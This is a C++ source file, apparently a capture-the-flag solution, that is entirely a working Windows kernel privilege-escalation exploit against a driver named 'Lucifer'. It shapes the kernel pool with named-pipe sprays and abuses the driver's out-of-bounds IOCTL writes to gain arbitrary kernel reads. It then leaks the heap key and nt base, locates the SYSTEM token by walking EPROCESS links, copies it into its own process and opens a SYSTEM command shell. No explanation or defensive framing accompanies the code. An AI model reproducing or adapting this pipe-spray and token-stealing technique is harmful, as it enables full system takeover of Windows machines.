#pragma comment(lib, "ntdll")

#include <cstdio>
#include <windows.h>
#define LUCIFER_IOCTL_METHOD_CREATE \
    CTL_CODE( FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS  )

#define LUCIFER_IOCTL_METHOD_ADD \
    CTL_CODE( FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS  )

#define LUCIFER_IOCTL_METHOD_GET \
    CTL_CODE( FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS  )

#define LUCIFER_IOCTL_METHOD_RELEASE \
    CTL_CODE( FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS  )
#define RtlpHpSegVsAllocate_OFF 0x295c00
#define PsInitialSystemProcess_OFF 0xcfc420
#define Token_OFF 0x4b8
#define UniqueProcessId_off 0x440
#define ActiveProcessLinks_off 0x448
struct pipe {
    UINT64 cnt;
    size_t size;
    HANDLE* readPipe;
    HANDLE* writePipe;
};

HANDLE* readPipe = NULL;
HANDLE* writePipe = NULL;
HANDLE* fill_readPipe = NULL;
HANDLE* fill_writePipe = NULL;

struct pipe* hole_pipes;
struct pipe* target_pipes;
struct pipe* evil_pipes;

struct pipe* fill_pipes;
UINT64 nt_base = -1;
UINT64 PsInitialSystemProcess = -1;
UINT64 pid = -1;
struct pipe * prepare_pipe(size_t size, UINT64 cnt) {
    UINT64 count = 0;
    BOOL res;
    struct pipe* newpipe = (struct pipe*)malloc(sizeof(struct pipe));
    if (!newpipe) {
        puts("Malloc Error");
    }
    newpipe->readPipe = (HANDLE*)malloc(cnt * sizeof(HANDLE));
    newpipe->writePipe = (HANDLE*)malloc(cnt * sizeof(HANDLE));
    newpipe->cnt = cnt;
    newpipe->size = size;
    for (count = 0; count < cnt; count++)
        res = CreatePipe(&newpipe->readPipe[count], &newpipe->writePipe[count], NULL, size - 0x30+0x10200);
    return newpipe;
}

void getshell() {
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    printf("Win\n");
    system("C:\\Windows\\System32\\cmd.exe");
}

void spray(struct pipe *pipe) {

    UINT64 count = 0;
    DWORD resultLength = 1;
   
    UCHAR* payload = (UCHAR*)malloc(pipe->size-0x30);
    BOOL res;
    if (!payload) {
        puts("Malloc error");
        exit(0);

    }
    RtlFillMemory((LPVOID)payload, pipe->size - 0x30, 0x45);

    for (count = 0; count < pipe->cnt; count++) {
        res = WriteFile(pipe->writePipe[count], (LPCVOID)payload, pipe->size - 0x30, &resultLength, NULL);

    }
    free(payload);
}

void close_all_pipe_from_idx(struct pipe* pipe,UINT64 idx) {
    for (size_t i = idx ; i < pipe->cnt; i++)
    {
        CloseHandle(pipe->writePipe[i]);
        CloseHandle(pipe->readPipe[i]);
    }
}

void close_pipe(UINT64 index) {
    CloseHandle(writePipe[index]);
    CloseHandle(readPipe[index]);

}

void free_pipes(struct pipe* pipe, UINT64 cnt, int start)
{
    for (size_t i = start; i < cnt; i += 3)
    {
        close_pipe(i);
    }
}

void create_hole(struct pipe* pipe,int start) {
    for (size_t i = start; i < pipe->cnt; i +=3 )
    {
        CloseHandle(pipe->writePipe[i]);
        CloseHandle(pipe->readPipe[i]);
    }
}


struct request {
    UINT64 idx;
    UINT64 magic;
    UINT64 data;
};

HANDLE h = NULL;

BOOL opendevice() {
    h = CreateFileA("\\\\.\\GLOBALROOT\\Device\\Lucifer",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == NULL) {
        printf("[-] Failed to open \\Device\\lucifer: %u\n", GetLastError());
        return 1;
    }
    return 0;
}

UINT64 luci_get(UINT64 idx) {

    size_t IoctlSize = 0;
    UINT64 ret = 0;
    IoctlSize = sizeof(struct request);
    struct request* r = NULL;
    struct request* out = NULL;
    r = (struct request*)HeapAlloc(GetProcessHeap(), 0, IoctlSize);
    out = (struct request*)HeapAlloc(GetProcessHeap(), 0, IoctlSize);

    RtlZeroMemory(r, IoctlSize);

    ULONG_PTR OutputBuffer = 0;
    DWORD BytesReturned;
    r->idx = idx;
    r->magic = 0xdadaddaa;
    r->data = NULL;
    BOOL Status = DeviceIoControl(
        h,
        LUCIFER_IOCTL_METHOD_GET,
        r,
        IoctlSize,
        out,
        IoctlSize,
        &BytesReturned,
        NULL
    );
    ret = r->data;

    HeapFree(GetProcessHeap(), 0, r);
    return ret;
}

void expand_pipe(struct pipe* pipe,size_t size,UINT64 index) {
    UCHAR* payload = (UCHAR*)malloc(size - 0x30);
    DWORD resultLength = 0;
    BOOL res = 0;
    res = WriteFile(pipe->writePipe[index], (LPCVOID)payload, size - 0x30, &resultLength, NULL);
}

UINT64 luci_add(UINT64 idx,UINT64 data) {

    size_t IoctlSize = 0;
    UINT64 ret = 0;
    IoctlSize = sizeof(struct request);
    struct request* r = NULL;
    struct request* out = NULL;
    r = (struct request*)HeapAlloc(GetProcessHeap(), 0, IoctlSize);
    out = (struct request*)HeapAlloc(GetProcessHeap(), 0, IoctlSize);

    RtlZeroMemory(r, IoctlSize);

    ULONG_PTR OutputBuffer = 0;
    DWORD BytesReturned;
    r->idx = idx;
    r->magic = 0xdadaddaa;
    r->data = data;
    BOOL Status = DeviceIoControl(
        h,
        LUCIFER_IOCTL_METHOD_ADD,
        r,
        IoctlSize,
        out,
        IoctlSize,
        &BytesReturned,
        NULL
    );
    ret = r->data;

    HeapFree(GetProcessHeap(), 0, r);
    return ret;
}

UINT64 luci_create() {

    size_t IoctlSize = 0;
    UINT64 ret = 0;
    IoctlSize = sizeof(struct request);
    struct request* r = NULL;
    struct request* out = NULL;
    r = (struct request*)HeapAlloc(GetProcessHeap(), 0, IoctlSize);
    out = (struct request*)HeapAlloc(GetProcessHeap(), 0, IoctlSize);

    RtlZeroMemory(r, IoctlSize);

    ULONG_PTR OutputBuffer = 0;
    DWORD BytesReturned;

    BOOL Status = DeviceIoControl(
        h,
        LUCIFER_IOCTL_METHOD_CREATE,
        r,
        IoctlSize,
        out,
        IoctlSize,
        &BytesReturned,
        NULL
    );
    ret = r->data;

    HeapFree(GetProcessHeap(), 0, r);
    return ret;
}

UINT64 luci_release() {

    size_t IoctlSize = 0;
    UINT64 ret = 0;
    IoctlSize = sizeof(struct request);

    struct request* r = NULL;
    struct request* out = NULL;
    r = (struct request*)HeapAlloc(GetProcessHeap(), 0, IoctlSize);
    out = (struct request*)HeapAlloc(GetProcessHeap(), 0, IoctlSize);

    RtlZeroMemory(r, IoctlSize);

    ULONG_PTR OutputBuffer = 0;
    DWORD BytesReturned;

    BOOL Status = DeviceIoControl(
        h,
        LUCIFER_IOCTL_METHOD_RELEASE,
        r,
        IoctlSize,
        out,
        IoctlSize,
        &BytesReturned,
        NULL
    );
    ret = r->data;

    HeapFree(GetProcessHeap(), 0, r);
    return ret;
}

UINT64 search_pipe(struct pipe* search_pipe, UINT64 key) {
    int count = 0;
    DWORD resultLength;
    UINT64 val = 0;
    UINT64 idx = -1;
    BOOL res;
    for (count = 0; count < search_pipe->cnt; count++) {
        res = ReadFile(search_pipe->readPipe[count], &val, 8, &resultLength, NULL);
        if (val == key) {
            printf("Found ! index: 0x%x \n", count);
            idx = count;
            break;
        }
    }
    return idx;
}

void read_from_pipe(struct pipe* pipe,UINT64 index,size_t size,VOID *buf) {
    DWORD resultLength;
    ReadFile(pipe->readPipe[index], buf, size, &resultLength, NULL);
}


UINT64 target_read_cnt = 0;
UINT64* fake_IRP = NULL;   
UINT64 target_idx = -1;


UINT64 readmem(UINT64 addr) {
    if (!fake_IRP) {
        fake_IRP = (UINT64*)malloc(0xd0);
    }

    UINT64* result_buf = (UINT64*)calloc(1,0x100);
    fake_IRP[3] = addr - target_read_cnt; //systembuffer
    UINT64 val = -1;
    luci_add(142, 0x0000100000000001); //overwrite pipequeue->remainder_bytes and allocated bit
    luci_add(143, 0x1000); //overwrite pipequeue->DataSize
    luci_add(140, (UINT64)fake_IRP);
   
    read_from_pipe(target_pipes, target_idx, 8, result_buf);
    target_read_cnt += 8;
    luci_add(142, 0x0000100000000000); //recover IRP to avoid pipe clean up
    luci_add(140, 0);
    val = result_buf[0];
    free(result_buf);
    return val;
}


int main() {

    if (opendevice()) {
        puts("Error");
        exit(0);
    }
    pid = GetProcessId(GetCurrentProcess());
    if (!pid) {
        puts("Cannot get processId!");
        exit(-2);
    }
    luci_release();
    hole_pipes = prepare_pipe(0x800-0x40, 0x10000);
    fill_pipes = prepare_pipe(0x7d0 - 0x40, 0x10000);
    evil_pipes = prepare_pipe(0x400, 0x10000);
    target_pipes = prepare_pipe(0x3c0-0x40, 0x10000);

    spray(hole_pipes);
    spray(fill_pipes);
    close_all_pipe_from_idx(hole_pipes,0x5000);
    spray(evil_pipes);
    spray(target_pipes);
    create_hole(evil_pipes, 0x5000);
    puts("create");
    luci_create();
    luci_add(144, 0xdeadbeefda);
    target_idx = search_pipe(target_pipes,0xdeadbeefda);
    target_read_cnt += 8;
    if (target_idx == -1) {
        puts("not found !");
        exit(-1);
    }
    expand_pipe(target_pipes, 0x10000, target_idx);
    luci_add(142, 0x0000100000000000);
    luci_add(143, 0x1000); //overwrite _NP_DATA_QUEUE_ENTRY->DataSize
    UINT64* buf = (UINT64*)malloc(0x1000);

    read_from_pipe(target_pipes, target_idx, 0x400, buf);
    target_read_cnt += 0x400;
    UINT64 fill_pipe_head_obj = buf[0x71];
    UINT64 fill_pipe_vs_header = buf[0x6d];

    UINT64 fill_pipe_queue_addr = readmem(fill_pipe_head_obj);
    printf("fill_pipe_queue_addr : 0x%llx\n", fill_pipe_queue_addr);
    UINT64 Luci_buffer_addr = fill_pipe_queue_addr - 0x810;
    UINT64 fill_pipe_queue_chunk = fill_pipe_queue_addr - 0x20;
    UINT64 expected_chunk_headr = 0x0010002007e0000;
	// to get nt 
	// you also can use other way to get nt.
    UINT64 RtlpHpHeapGlobals_HeapKey = expected_chunk_headr ^ fill_pipe_queue_chunk ^ fill_pipe_vs_header;
    printf("RtlpHpHeapGlobals.HeapKey : 0x%llx\n", RtlpHpHeapGlobals_HeapKey);
    UINT64 vs_page_segment = fill_pipe_queue_chunk & 0xfffffffffff00000;
    UINT64 vs_page_segment_sig = readmem(vs_page_segment + 0x10);
    printf("vs_page_segment: 0x%llx\n", vs_page_segment);
    UINT64 segcontext = vs_page_segment ^ vs_page_segment_sig ^ RtlpHpHeapGlobals_HeapKey ^ 0xA2E64EADA2E64EAD;
    printf("segcontext: 0x%llx\n", segcontext);
    UINT64 segment_heap = segcontext - 0x100;
    UINT64 vs_context = segment_heap + 0x280;
    UINT64 vs_callback_allocate_addr = vs_context + 0x88;
    UINT64 vs_callback_allocate_encode = readmem(vs_callback_allocate_addr);
    UINT64 vs_callback_allocate = vs_callback_allocate_encode ^ RtlpHpHeapGlobals_HeapKey ^ vs_context;
    nt_base = vs_callback_allocate - RtlpHpSegVsAllocate_OFF;
    printf("nt: 0x%llx\n", nt_base);
    PsInitialSystemProcess = readmem(nt_base + PsInitialSystemProcess_OFF);
    UINT64 system_token = readmem(PsInitialSystemProcess + Token_OFF);
    UINT64 Process = -1;
    UINT64 pid_iter = -1;
    UINT64 Current_eprocess = -1;
    for (Process = readmem(PsInitialSystemProcess+ ActiveProcessLinks_off)-0x448;;Process = readmem(Process+ActiveProcessLinks_off)-0x448) {
        pid_iter = readmem(Process + UniqueProcessId_off);
        if (pid_iter == 4) {
            puts("Cannot find the target process\n");
            exit(1337);
        }
        if (pid_iter == pid) {
            puts("found the target _eprocess\n");
            Current_eprocess = Process;
            break;
        }
    }
    printf("Current Eprocess: 0x%llx\n", Current_eprocess);
    UINT64 target_process_token_idx = ((Current_eprocess + Token_OFF) - Luci_buffer_addr)/8;
    luci_add(target_process_token_idx, system_token);

   
    getshell();
    getchar();
    CloseHandle(h);

    return 0;
}
